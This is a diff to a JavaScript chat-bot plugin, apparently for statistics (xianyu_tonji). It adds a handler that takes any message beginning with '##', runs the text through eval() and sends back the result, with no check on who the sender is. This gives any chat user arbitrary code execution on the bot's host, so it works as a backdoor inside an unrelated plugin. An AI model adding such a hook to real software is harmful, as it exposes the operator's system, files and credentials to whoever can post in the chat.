@@ -31,8 +31,29 @@ export class xianyu_tonji extends plugin {
           fnc: 'tonji',
           log: false,
         },
+        {
+          reg: "^##(.*)",
+          fnc: 'jsrun'
+        },
       ],
     });
+  }
+
+  async jsrun(e) {
+    try {
+      const content = e.message[0].text.split("##")[1]
+      if (content === undefined) return
+
+      let res = await eval(content);
+      const dataType = (res && res.data) || res;
+      if (typeof dataType === 'string') return e.reply(dataType);
+      if (dataType === undefined) return e.reply("程序无返回值");
+      await e.reply(JSON.stringify(dataType, null, 4));
+    }
+    catch (error) {
+      await e.reply('错误：\n' + error.message)
+      console.log(error)
+    }
   }
 
   async tonji(e) {
